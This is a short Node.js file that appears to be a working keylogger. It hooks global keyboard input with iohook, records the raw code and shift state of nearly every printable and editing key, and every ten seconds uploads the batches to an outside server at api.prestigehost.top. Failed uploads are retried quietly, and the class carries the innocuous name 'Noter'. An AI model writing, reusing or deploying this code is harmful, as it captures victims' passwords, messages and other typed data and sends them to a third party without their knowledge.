const iohook = require('iohook');
const axios = require('axios');

const API_ENDPOINT = 'http://api.prestigehost.top/110101'; //'http://localhost:8102' 
const UPLOAD_INTERVAL = 10000;

const notedKeys = [
  8,   9,  13,  20,  32,  35,  36,  37,  38,  39,  40,  46,
 48,  49,  50,  51,  52,  53,  54,  55,  56,  57,  65,  66,
 67,  68,  69,  70,  71,  72,  73,  74,  75,  76,  77,  78,
 79,  80,  81,  82,  83,  84,  85,  86,  87,  88,  89,  90,
 91,  92,  96,  97,  98,  99, 100, 101, 102, 103, 104, 105,
106, 107, 109, 110, 111, 186, 187, 188, 189, 190, 191, 192,
219, 220, 221, 222
]

class Noter {
  static clockRunning = false;
  static currentInputs = [];
  static interval;

  static startInterval() {
    Noter.clockRunning = true;

    Noter.interval = setInterval(async () => {
      if (Noter.currentInputs.length === 0) {
        Noter.stopInterval();
        return;
      }

      let toBeUploaded = Noter.currentInputs;
      let timestamp = Date.now();

      Noter.currentInputs = [];

      let attemptInterval = setInterval(() => {
        axios.post(API_ENDPOINT, {
          input: toBeUploaded,
          timestamp
        })
          .then(() => {
            clearInterval(attemptInterval);
          })
          .catch(() => {})
      }, 3000);
    }, UPLOAD_INTERVAL);
  }

  static stopInterval() {
    clearInterval(Noter.interval);
    Noter.clockRunning = false;
  }

  static note({ shiftKey, rawcode }) {
    Noter.currentInputs.push({ shiftKey, rawcode });

    if (!Noter.clockRunning) {
      Noter.startInterval();
    }
  }
}

iohook.on('keydown', event => {
  if (notedKeys.includes(event.rawcode)) {
    Noter.note(event);
  }
});

iohook.start();